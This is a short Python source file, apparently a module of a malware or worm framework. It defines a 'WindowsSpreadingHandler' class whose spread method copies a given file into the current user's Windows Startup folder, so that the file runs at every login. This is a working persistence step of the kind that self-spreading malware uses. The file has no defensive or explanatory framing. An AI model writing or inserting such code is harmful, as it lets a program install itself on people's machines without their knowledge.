import os
from shutil import copy
from utils import logger


class WindowsSpreadingHandler:
    @classmethod
    def get_platform(cls):
        return "windows"

    def spread(self,file)-> bool:
        try:
            cwd=os.getcwd()
            if not os.path.exists(os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Roaming\\Microsoft\\Windows\\Start menu\\Programs\\Startup\\%s'%file):
                copy(file,os.path.expanduser(os.getenv('USERPROFILE'))+'\\AppData\\Roaming\\Microsoft\\Windows\\Start menu\\Programs\\Startup\\')                
            return True
        except Exception as e:
            logger.exception(e)
            return False
